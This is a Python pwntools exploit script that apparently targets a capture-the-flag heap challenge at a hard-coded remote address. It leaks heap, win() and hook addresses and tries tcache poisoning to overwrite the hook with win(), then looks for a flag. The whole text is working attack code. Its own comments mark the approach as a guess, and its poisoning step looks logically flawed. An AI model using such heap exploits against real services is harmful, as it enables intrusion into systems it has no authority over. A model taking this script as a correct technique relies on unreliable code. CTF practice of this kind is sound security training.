#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Maybe the hook is actually a function pointer that gets called
# Let's try to write win() address directly to hook using UAF

# Create chunks
for i in range(7):  # Fill tcache
    io.sendline(b'1')
    io.sendlineafter(b':', b'24')
    io.sendlineafter(b':', b'X' * 24)
    io.recvuntil(b'>')

# Free all to fill tcache
for i in range(7):
    io.sendline(b'3')
    io.sendlineafter(b':', str(i).encode())
    io.recvuntil(b'>')

# Reallocate first one and write hook address
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', p64(hook) + b'Y' * 16)
io.recvuntil(b'>')

# Allocate 6 more times
for i in range(6):
    io.sendline(b'1')
    io.sendlineafter(b':', b'24')
    io.sendlineafter(b':', b'Z' * 24)
    io.recvuntil(b'>')

# Next should be at hook
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', p64(win) + b'W' * 16)
io.recvuntil(b'>')

# Try all triggers
print("[*] Trying delete...")
io.sendline(b'3')
io.sendlineafter(b':', b'0')
output = io.recv(timeout=1)
print(output.decode(errors='ignore'))

print("[*] Trying exit...")
io.sendline(b'5')
output = io.recvall(timeout=2)
result = output.decode(errors='ignore')
print(result)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")

io.close()
